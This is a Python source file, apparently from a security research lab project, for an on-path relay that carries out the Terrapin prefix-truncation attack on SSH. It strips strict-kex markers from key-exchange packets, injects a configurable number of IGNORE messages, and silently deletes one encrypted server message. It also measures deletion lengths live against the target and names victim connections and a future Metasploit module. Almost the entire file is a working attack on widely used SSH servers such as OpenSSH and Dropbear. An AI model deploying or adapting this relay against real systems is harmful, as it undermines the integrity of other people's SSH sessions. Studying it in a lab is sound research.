#!/usr/bin/env python3
"""
Bounded-contribution-plan relay: an on-path TCP relay for SSH, extending
terrapin-harness-submission:terrapin-harness/relay/relay.py with two of the
five roadmap items from the project write-up / slide 8:

  item 2, "Full truncation" -- --full-truncation additionally deletes one
      server->client post-NEWKEYS message, compensating for the injected
      IGNORE so the handshake's sequence-number skew is fully cancelled
      out instead of just detectable downstream. See truncation_profiles.py
      for how the deletion length is determined (direct wire read for
      GCM/ETM pairings, a measured fixed-byte profile otherwise) and
      scripts/calibrate_truncation.py for how those profiles were measured.

      NEW: --auto-calibrate. truncation_profiles.py's static table is only
      confirmed against one real OpenSSH build (9.6p1) -- it is NOT
      confirmed for this lab's actual pins (OpenSSH 9.2p1-2+deb12u1/u2,
      Dropbear 2022.83, russh 0.40.x, Gitea's Go ssh). Rather than trust a
      possibly-wrong number for a blind cipher (chacha20-poly1305@openssh.com,
      or any cipher without an *-etm@openssh.com MAC), --auto-calibrate
      makes the relay measure the real byte count itself, live, against
      --backend-host:--backend-port, the first time it needs one -- the
      same idle-gap recv()-boundary method scripts/calibrate_truncation.py
      uses, inlined here so it runs automatically instead of needing a
      separate manual step first. Requires its own ssh credentials for the
      *measurement* connection (--calibrate-user plus --calibrate-password
      or --calibrate-identity-file) -- these are NOT the victim's
      credentials; they're used for a side connection the relay opens
      directly to the backend, bypassing itself, purely to time the
      server's first post-NEWKEYS message (which is sent before
      authentication, so even a login that ultimately fails still yields
      a valid measurement). Falls back to truncation_profiles.py's static
      table (and then to --truncation-bytes, and then to skipping the
      deletion) if calibration can't run or doesn't produce a consistent
      answer. Successful measurements are cached in-process by
      (server banner, cipher) so a long-running relay only calibrates once
      per pairing, not once per connection.

  item 3, "Automation" -- --message-count lets a caller (the CLI in
      cli.py, or a future Metasploit module) parameterize how many
      SSH_MSG_IGNORE packets are injected, as the write-up specified
      ("a configurable ... module, parameterized by target, cipher mode,
      and message count").

item 1, "Breadth", needs no change here: this module's framing (ssh_wire.py)
is protocol-generic, so pointing --backend-port at 22/2222/2223/2224
(see targets.py) exercises OpenSSH, Dropbear, russh, and Gitea's SSH
daemon without touching this file.

Modes:
  passthrough     -- forward every byte unmodified (baseline).
  inject_ignore   -- additionally send --message-count crafted,
                     unsolicited SSH_MSG_IGNORE packets to the client
                     right after the KEXINIT exchange, before NEWKEYS.
                     This is the RcvIncrease primitive (Baeumer et al.
                     2024, Fig. 4a / Sec. 4.1).

Everything after NEWKEYS has been seen in both directions (and any
full-truncation deletion has been applied) is opaque ciphertext to this
relay and is spliced through raw, unparsed, using two forwarding threads
-- unchanged from the harness branch.
"""

from __future__ import annotations

import argparse
import os
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass
from pathlib import Path

from logger import JsonlLogger
from ssh_wire import (
    ConnectionClosed,
    PlainPacket,
    SSH_MSG_KEXINIT,
    SSH_MSG_NEWKEYS,
    build_ignore_packet,
    build_plain_packet_from_payload,
    has_strict_kex_marker,
    msg_name,
    negotiate_algorithm,
    negotiated_server_to_client_cipher,
    negotiated_server_to_client_mac,
    recv_exact,
    recv_plain_packet,
    recv_version_banner,
    strip_strict_kex_marker,
)
from truncation_profiles import length_is_visible_on_wire, lookup as lookup_truncation_profile, trailing_tag_bytes

HANDSHAKE_TIMEOUT_SECONDS = 30

# Cache of live auto-calibration results for this relay process's lifetime,
# keyed by (server banner's first token, negotiated s2c cipher) -- so a
# relay serving more than one connection (i.e. not run with --once) only
# pays the calibration cost once per pairing.
_calibration_cache: dict[tuple[str, str], int] = {}


@dataclass
class AutoCalibrateConfig:
    """--auto-calibrate's settings, bundled so they thread through the
    handshake call chain as one argument instead of five."""

    enabled: bool
    user: str
    password: str | None
    identity_file: str | None
    trials: int
    listen_port: int


def raw_splice(src: socket.socket, dst: socket.socket, logger: JsonlLogger, label: str) -> None:
    """Blindly forward raw bytes from src to dst until either side closes."""
    total = 0
    try:
        while True:
            chunk = src.recv(65536)
            if not chunk:
                break
            dst.sendall(chunk)
            total += len(chunk)
    except (ConnectionError, OSError):
        pass
    finally:
        logger.log("splice_closed", direction=label, length=total)
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def relay_one_direction_packet(
    src: socket.socket,
    dst: socket.socket,
    logger: JsonlLogger,
    direction: str,
    strip_strict_kex: bool,
) -> PlainPacket:
    """Read one plaintext BPP packet from src, optionally rewrite it, forward to dst."""
    pkt = recv_plain_packet(src)
    out_bytes = pkt.raw

    if strip_strict_kex and pkt.msg_type == SSH_MSG_KEXINIT:
        had_marker = has_strict_kex_marker(pkt.payload)
        if had_marker:
            new_payload = strip_strict_kex_marker(pkt.payload)
            out_bytes = build_plain_packet_from_payload(new_payload)
            logger.log(
                "kexinit_rewritten",
                direction=direction,
                note="stripped kex-strict-* marker",
            )

    logger.log(
        "packet",
        direction=direction,
        msg_type=pkt.msg_type,
        msg_name=msg_name(pkt.msg_type),
        length=len(pkt.raw),
    )
    dst.sendall(out_bytes)
    return pkt


def _run_calibration_trial(
    backend_host: str,
    backend_port: int,
    cipher: str,
    mac: str | None,
    autocal: AutoCalibrateConfig,
) -> int | None:
    """One calibration trial, inlining scripts/calibrate_truncation.py's
    idle-gap recv()-boundary method so relay.py can self-calibrate instead
    of trusting a possibly-stale truncation_profiles.py entry.

    Opens its OWN throwaway connection directly to backend_host:backend_port
    (a side channel, separate from whatever real attack connection
    triggered this), drives a real `ssh` subprocess at it forcing the
    target cipher/mac, relays the plaintext handshake through exactly like
    the real relay does, then measures the size of the very first raw
    recv() once NEWKEYS has completed in both directions. That first
    server->client message (typically SSH_MSG_EXT_INFO) is sent before
    authentication, so this works even if --calibrate-password/
    --calibrate-identity-file don't grant a successful login -- only the
    key exchange needs to complete.

    Returns the measured size in bytes, or None if this trial produced no
    usable measurement (bad creds plus no auth attempt reaching the
    server, missing `ssh`/`sshpass` binary, connection refused, etc.).
    """
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", autocal.listen_port))
    listener.listen(1)
    listener.settimeout(15)

    result: dict[str, int] = {}

    def wait_for_client() -> None:
        try:
            client_sock, _ = listener.accept()
        except OSError:
            return
        client_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        try:
            server_sock = socket.create_connection((backend_host, backend_port), timeout=10)
        except OSError:
            client_sock.close()
            return
        server_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            client_banner = recv_version_banner(client_sock)
            server_sock.sendall(client_banner)
            server_banner = recv_version_banner(server_sock)
            client_sock.sendall(server_banner)

            newkeys_seen = {"c2s": False, "s2c": False}
            while not all(newkeys_seen.values()):
                if not newkeys_seen["c2s"]:
                    pkt = recv_plain_packet(client_sock)
                    server_sock.sendall(pkt.raw)
                    if pkt.msg_type == SSH_MSG_NEWKEYS:
                        newkeys_seen["c2s"] = True
                if not newkeys_seen["s2c"]:
                    pkt = recv_plain_packet(server_sock)
                    client_sock.sendall(pkt.raw)
                    if pkt.msg_type == SSH_MSG_NEWKEYS:
                        newkeys_seen["s2c"] = True

            server_sock.settimeout(0.08)
            deadline = time.monotonic() + 2.0
            reads: list[bytes] = []
            while time.monotonic() < deadline:
                try:
                    chunk = server_sock.recv(65536)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                reads.append(chunk)
                client_sock.sendall(chunk)
            if reads:
                result["size"] = len(reads[0])
        except (ConnectionClosed, ConnectionError, OSError, TimeoutError):
            pass
        finally:
            for s in (server_sock, client_sock):
                try:
                    s.settimeout(None)
                    s.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                s.close()

    th = threading.Thread(target=wait_for_client)
    th.start()

    ssh_cmd = [
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        "-o", "ConnectTimeout=8", "-o", "LogLevel=ERROR",
        "-p", str(autocal.listen_port), "-c", cipher,
    ]
    if mac:
        ssh_cmd += ["-m", mac]
    if autocal.identity_file:
        ssh_cmd += ["-i", autocal.identity_file]
    ssh_cmd += [f"{autocal.user}@127.0.0.1", "--", "true"]
    if autocal.password:
        ssh_cmd = ["sshpass", "-p", autocal.password] + ssh_cmd

    time.sleep(0.2)  # let the listener thread reach accept() first
    try:
        subprocess.run(ssh_cmd, capture_output=True, timeout=15)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    th.join(timeout=10)
    listener.close()
    return result.get("size")


def _auto_calibrate(
    logger: JsonlLogger,
    backend_host: str,
    backend_port: int,
    server_banner: bytes,
    cipher: str,
    mac: str | None,
    autocal: AutoCalibrateConfig,
) -> int | None:
    """Run (or reuse a cached) live calibration for this (banner, cipher)
    pairing. Returns the confirmed byte count, or None if calibration
    wasn't attempted or didn't produce a consistent answer -- in either
    case the caller falls back to truncation_profiles.py."""
    banner_text = server_banner.decode(errors="replace").strip()
    banner_key = banner_text.split()[0] if banner_text else "UNKNOWN"
    cache_key = (banner_key, cipher)

    if cache_key in _calibration_cache:
        cached = _calibration_cache[cache_key]
        logger.log(
            "truncation_autocal_cached",
            note=f"reusing earlier live measurement for banner={banner_key} cipher={cipher}: {cached} bytes",
        )
        return cached

    if not autocal.password and not autocal.identity_file:
        logger.log(
            "truncation_autocal_skipped",
            note="--auto-calibrate set but neither --calibrate-password nor "
            "--calibrate-identity-file was given; falling back to truncation_profiles.py",
        )
        return None

    logger.log(
        "truncation_autocal_start",
        note=f"measuring live against {backend_host}:{backend_port} cipher={cipher} mac={mac or '(none/AEAD)'} "
        f"-- {autocal.trials} trial(s) required to agree, same method as scripts/calibrate_truncation.py",
    )

    sizes: list[int] = []
    for i in range(autocal.trials):
        size = _run_calibration_trial(backend_host, backend_port, cipher, mac, autocal)
        if size is None:
            logger.log("truncation_autocal_trial_failed", note=f"trial {i + 1}/{autocal.trials} produced no measurement")
            continue
        sizes.append(size)
        logger.log("truncation_autocal_trial", note=f"trial {i + 1}/{autocal.trials}: {size} bytes")

    if not sizes or len(set(sizes)) != 1:
        logger.log(
            "truncation_autocal_failed",
            note=f"no consistent measurement across {autocal.trials} trial(s) (got {sizes}); "
            "falling back to truncation_profiles.py's static table, then --truncation-bytes, then skipping",
        )
        return None

    measured = sizes[0]
    _calibration_cache[cache_key] = measured
    logger.log(
        "truncation_autocal_confirmed",
        note=f"{measured} bytes, {len(sizes)}/{len(sizes)} identical trials against {backend_host}:{backend_port} "
        f"(banner={banner_key}, cipher={cipher}). To skip recalibrating next run, paste into "
        f"truncation_profiles.py's PROFILES: (\"{banner_key}\", \"{cipher}\"): TruncationProfile("
        f"first_message_bytes={measured}, confirmed=True, "
        f"source=\"measured live by relay.py --auto-calibrate against {backend_host}:{backend_port}\"),",
    )
    return measured


def _resolve_truncation_plan(
    logger: JsonlLogger,
    server_banner: bytes,
    client_kexinit: PlainPacket,
    server_kexinit: PlainPacket,
    override_bytes: int | None,
    backend_host: str,
    backend_port: int,
    autocal: AutoCalibrateConfig,
) -> tuple[str, int, int]:
    """Return (mode, value, tag_bytes):
    - 'visible': value unused (length is read live); tag_bytes is the
      trailing AEAD-tag/ETM-MAC length to also consume after it.
    - 'fixed': value = bytes to blindly delete; tag_bytes always 0 (the
      profile's byte count already covers the whole on-wire record).
    - 'skip': both 0.
    """
    if override_bytes is not None:
        logger.log(
            "truncation_length_source",
            note=f"using operator-supplied --truncation-bytes={override_bytes}",
        )
        return "fixed", override_bytes, 0

    cipher = negotiated_server_to_client_cipher(client_kexinit.payload, server_kexinit.payload)
    mac = negotiated_server_to_client_mac(client_kexinit.payload, server_kexinit.payload) or ""

    if cipher is None:
        logger.log("truncation_skipped", note="could not determine negotiated s2c cipher")
        return "skip", 0, 0

    if length_is_visible_on_wire(cipher, mac):
        tag_bytes = trailing_tag_bytes(cipher, mac)
        logger.log(
            "truncation_length_source",
            note=f"cipher={cipher} mac={mac}: length field visible on wire "
            f"(AEAD or *-etm@openssh.com), reading it directly at delete time; "
            f"trailing tag/MAC={tag_bytes} bytes",
        )
        return "visible", 0, tag_bytes

    # Blind cipher (e.g. chacha20-poly1305@openssh.com): the length field is
    # encrypted, so we either need a live measurement or a pre-recorded one.
    # Try a live measurement against the REAL backend first -- it is correct
    # by construction for this exact server, unlike a static table entry
    # measured on a different OpenSSH build/version.
    if autocal.enabled:
        measured = _auto_calibrate(logger, backend_host, backend_port, server_banner, cipher, mac, autocal)
        if measured is not None:
            return "fixed", measured, 0
        # falls through to the static table below

    banner_text = server_banner.decode(errors="replace")
    profile = lookup_truncation_profile(banner_text, cipher)
    if profile is None:
        logger.log(
            "truncation_skipped",
            note=f"no profile for banner={banner_text.strip()!r} cipher={cipher}; "
            "refusing to guess. Supply --truncation-bytes, pass --auto-calibrate "
            "(with --calibrate-password/--calibrate-identity-file), or add/measure "
            "a profile (see truncation_profiles.py and scripts/calibrate_truncation.py).",
        )
        return "skip", 0, 0

    confirmed_tag = "CONFIRMED" if profile.confirmed else "UNCONFIRMED"
    logger.log(
        "truncation_length_source",
        note=f"{confirmed_tag} profile for cipher={cipher}: {profile.source}",
    )
    return "fixed", profile.first_message_bytes, 0


def _delete_visible_length_record(server_sock: socket.socket, logger: JsonlLogger, tag_bytes: int) -> None:
    """Read and discard exactly one length-prefixed ciphertext record,
    INCLUDING its trailing AEAD tag (GCM) or MAC (*-etm@openssh.com).

    Calibration note (scripts/calibrate_truncation.py, against real
    OpenSSH 9.6p1): an earlier version of this function read only
    4 + record_length bytes and left the trailing tag/MAC unconsumed --
    confirmed by measurement to under-read by exactly 16 bytes (GCM) or
    32 bytes (hmac-sha2-256-etm), which would desync every subsequent
    record. truncation_profiles.trailing_tag_bytes() now supplies that
    count so it's consumed here too.
    """
    length_bytes = recv_exact(server_sock, 4)
    (record_length,) = struct.unpack(">I", length_bytes)
    recv_exact(server_sock, record_length + tag_bytes)
    logger.log(
        "truncation_delete",
        direction="server_to_client",
        length=4 + record_length + tag_bytes,
        note=f"deleted one length-prefixed record (length field was visible on wire; "
        f"payload={record_length}B + trailing tag/MAC={tag_bytes}B)",
    )


def _delete_fixed_length_record(server_sock: socket.socket, logger: JsonlLogger, nbytes: int) -> None:
    recv_exact(server_sock, nbytes)
    logger.log(
        "truncation_delete",
        direction="server_to_client",
        length=nbytes,
        note="deleted fixed-length record per profile/override/auto-calibration (blind-cipher path)",
    )


def run_handshake_phase(
    client_sock: socket.socket,
    server_sock: socket.socket,
    logger: JsonlLogger,
    inject_ignore: bool,
    message_count: int,
    strip_strict_kex: bool,
    full_truncation: bool,
    truncation_bytes_override: int | None,
    backend_host: str,
    backend_port: int,
    autocal: AutoCalibrateConfig,
) -> None:
    client_sock.settimeout(HANDSHAKE_TIMEOUT_SECONDS)
    server_sock.settimeout(HANDSHAKE_TIMEOUT_SECONDS)

    # --- Phase 0: version banners (plaintext, line-based, not BPP framed) ---
    client_banner = recv_version_banner(client_sock)
    logger.log("banner", direction="client_to_router", note=client_banner.decode(errors="replace").strip())
    server_sock.sendall(client_banner)

    server_banner = recv_version_banner(server_sock)
    logger.log("banner", direction="server_to_router", note=server_banner.decode(errors="replace").strip())
    client_sock.sendall(server_banner)

    # --- Phase 1a: relay the very first packet in each direction (KEXINIT) ---
    newkeys_seen = {"client_to_router": False, "server_to_router": False}
    client_kexinit = relay_one_direction_packet(
        client_sock, server_sock, logger, "client_to_router", strip_strict_kex
    )
    server_kexinit = relay_one_direction_packet(
        server_sock, client_sock, logger, "server_to_router", strip_strict_kex
    )

    # --- Optional injection: send N crafted IGNOREs straight to the client ---
    if inject_ignore:
        for i in range(message_count):
            ignore_pkt = build_ignore_packet()
            client_sock.sendall(ignore_pkt)
            logger.log(
                "inject",
                direction="router_to_client",
                msg_type=2,
                msg_name="SSH_MSG_IGNORE",
                length=len(ignore_pkt),
                note=f"synthetic packet {i + 1}/{message_count}, not derived from relayed traffic",
            )

    # --- Phase 1b: relay remaining plaintext packets until NEWKEYS seen both ways ---
    while not all(newkeys_seen.values()):
        if not newkeys_seen["client_to_router"]:
            pkt = relay_one_direction_packet(
                client_sock, server_sock, logger, "client_to_router", strip_strict_kex
            )
            if pkt.msg_type == SSH_MSG_NEWKEYS:
                newkeys_seen["client_to_router"] = True
        if not newkeys_seen["server_to_router"]:
            pkt = relay_one_direction_packet(
                server_sock, client_sock, logger, "server_to_router", strip_strict_kex
            )
            if pkt.msg_type == SSH_MSG_NEWKEYS:
                newkeys_seen["server_to_router"] = True

    logger.log("handshake_complete", note="NEWKEYS observed in both directions")

    # --- Roadmap item 2: full prefix truncation ---
    if inject_ignore and full_truncation:
        mode, value, tag_bytes = _resolve_truncation_plan(
            logger, server_banner, client_kexinit, server_kexinit, truncation_bytes_override,
            backend_host, backend_port, autocal,
        )
        if mode == "visible":
            _delete_visible_length_record(server_sock, logger, tag_bytes)
        elif mode == "fixed" and value > 0:
            _delete_fixed_length_record(server_sock, logger, value)
        # mode == "skip": already logged by _resolve_truncation_plan.


def handle_connection(
    client_sock: socket.socket,
    backend_host: str,
    backend_port: int,
    mode: str,
    message_count: int,
    strip_strict_kex: bool,
    full_truncation: bool,
    truncation_bytes_override: int | None,
    autocal: AutoCalibrateConfig,
    logger: JsonlLogger,
) -> None:
    client_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    server_sock = socket.create_connection((backend_host, backend_port), timeout=10)
    server_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    logger.log(
        "connected",
        note=f"backend={backend_host}:{backend_port} mode={mode} "
        f"message_count={message_count} strip_strict_kex={strip_strict_kex} "
        f"full_truncation={full_truncation} auto_calibrate={autocal.enabled}",
    )

    try:
        run_handshake_phase(
            client_sock,
            server_sock,
            logger,
            inject_ignore=(mode == "inject_ignore"),
            message_count=message_count,
            strip_strict_kex=strip_strict_kex,
            full_truncation=full_truncation,
            truncation_bytes_override=truncation_bytes_override,
            backend_host=backend_host,
            backend_port=backend_port,
            autocal=autocal,
        )
    except (ConnectionClosed, ConnectionError, OSError, TimeoutError) as exc:
        logger.log("handshake_failed", note=str(exc))
        client_sock.close()
        server_sock.close()
        return

    client_sock.settimeout(None)
    server_sock.settimeout(None)

    t1 = threading.Thread(target=raw_splice, args=(client_sock, server_sock, logger, "client_to_server_raw"))
    t2 = threading.Thread(target=raw_splice, args=(server_sock, client_sock, logger, "server_to_client_raw"))
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()
    logger.log("connection_closed")


def main() -> None:
    parser = argparse.ArgumentParser(description="Bounded-contribution-plan relay")
    parser.add_argument("--listen-host", default=os.environ.get("LISTEN_HOST", "0.0.0.0"))
    parser.add_argument("--listen-port", type=int, default=int(os.environ.get("LISTEN_PORT", "2222")))
    parser.add_argument("--backend-host", default=os.environ.get("BACKEND_HOST", "127.0.0.1"))
    parser.add_argument("--backend-port", type=int, default=int(os.environ.get("BACKEND_PORT", "22")))
    parser.add_argument(
        "--mode",
        choices=["passthrough", "inject_ignore"],
        default=os.environ.get("RELAY_MODE", "passthrough"),
    )
    parser.add_argument(
        "--message-count",
        type=int,
        default=int(os.environ.get("MESSAGE_COUNT", "1")),
        help="number of SSH_MSG_IGNORE packets to inject (roadmap item 3: Automation)",
    )
    parser.add_argument(
        "--strip-strict-kex",
        action="store_true",
        default=os.environ.get("STRIP_STRICT_KEX", "false").lower() == "true",
    )
    parser.add_argument(
        "--full-truncation",
        action="store_true",
        default=os.environ.get("FULL_TRUNCATION", "false").lower() == "true",
        help="roadmap item 2: also delete one server->client post-NEWKEYS message",
    )
    parser.add_argument(
        "--truncation-bytes",
        type=int,
        default=(int(os.environ["TRUNCATION_BYTES"]) if "TRUNCATION_BYTES" in os.environ else None),
        help="override: delete exactly this many bytes instead of consulting "
        "truncation_profiles.py (use after calibrating with "
        "scripts/calibrate_truncation.py, or just pass --auto-calibrate instead)",
    )
    parser.add_argument(
        "--auto-calibrate",
        action="store_true",
        default=os.environ.get("AUTO_CALIBRATE", "false").lower() == "true",
        help="roadmap item 2, hardening: when --full-truncation needs a blind-cipher byte count "
        "(chacha20-poly1305@openssh.com, or any non-etm pairing) and no --truncation-bytes override "
        "was given, measure it live against --backend-host:--backend-port instead of trusting "
        "truncation_profiles.py's static table (which is only confirmed for OpenSSH 9.6p1, not "
        "necessarily this target). Requires --calibrate-password or --calibrate-identity-file.",
    )
    parser.add_argument(
        "--calibrate-user",
        default=os.environ.get("CALIBRATE_USER", "lab"),
        help="--auto-calibrate: ssh username for the measurement connection (not the victim's; "
        "default matches this lab's 'lab' account)",
    )
    parser.add_argument(
        "--calibrate-password",
        default=os.environ.get("CALIBRATE_PASSWORD", os.environ.get("LAB_SSH_PASSWORD")),
        help="--auto-calibrate: password for the measurement connection (via sshpass). "
        "Defaults to $CALIBRATE_PASSWORD, then $LAB_SSH_PASSWORD. Login need not actually "
        "succeed -- the measurement only needs the key exchange to complete.",
    )
    parser.add_argument(
        "--calibrate-identity-file",
        default=os.environ.get("CALIBRATE_IDENTITY_FILE"),
        help="--auto-calibrate: alternative to --calibrate-password, an identity file for the "
        "measurement connection",
    )
    parser.add_argument(
        "--calibrate-trials",
        type=int,
        default=int(os.environ.get("CALIBRATE_TRIALS", "3")),
        help="--auto-calibrate: number of trials that must agree before trusting the measurement "
        "(same default and rationale as scripts/calibrate_truncation.py)",
    )
    parser.add_argument(
        "--calibrate-listen-port",
        type=int,
        default=int(os.environ.get("CALIBRATE_LISTEN_PORT", "12399")),
        help="--auto-calibrate: local throwaway port for the measurement connection's own "
        "listener (separate from --listen-port; must not already be in use)",
    )
    parser.add_argument("--log-file", default=os.environ.get("LOG_FILE", "/logs/relay.jsonl"))
    parser.add_argument(
        "--once",
        action="store_true",
        help="handle exactly one connection then exit (useful for scripted tests)",
    )
    args = parser.parse_args()

    autocal = AutoCalibrateConfig(
        enabled=args.auto_calibrate,
        user=args.calibrate_user,
        password=args.calibrate_password,
        identity_file=args.calibrate_identity_file,
        trials=args.calibrate_trials,
        listen_port=args.calibrate_listen_port,
    )

    logger = JsonlLogger(args.log_file)
    logger.log(
        "relay_start",
        note=f"listen={args.listen_host}:{args.listen_port} backend={args.backend_host}:{args.backend_port} "
        f"mode={args.mode} message_count={args.message_count} strip_strict_kex={args.strip_strict_kex} "
        f"full_truncation={args.full_truncation} truncation_bytes={args.truncation_bytes} "
        f"auto_calibrate={args.auto_calibrate}",
    )

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen(5)
    print(
        f"[relay] listening on {args.listen_host}:{args.listen_port}, "
        f"forwarding to {args.backend_host}:{args.backend_port} (mode={args.mode})",
        file=sys.stderr,
    )
    if args.full_truncation and args.auto_calibrate:
        print(
            "[relay] --auto-calibrate is on: a blind-cipher truncation will be measured live "
            f"against {args.backend_host}:{args.backend_port} the first time it's needed, "
            f"using ssh user={args.calibrate_user!r} "
            f"(creds: {'password' if args.calibrate_password else 'identity-file' if args.calibrate_identity_file else 'NONE -- will skip'})",
            file=sys.stderr,
        )

    try:
        while True:
            client_sock, addr = listener.accept()
            logger.log("accept", note=f"client={addr[0]}:{addr[1]}")
            handle_connection(
                client_sock,
                args.backend_host,
                args.backend_port,
                args.mode,
                args.message_count,
                args.strip_strict_kex,
                args.full_truncation,
                args.truncation_bytes,
                autocal,
                logger,
            )
            if args.once:
                break
    except KeyboardInterrupt:
        pass
    finally:
        listener.close()
        logger.close()


if __name__ == "__main__":
    main()
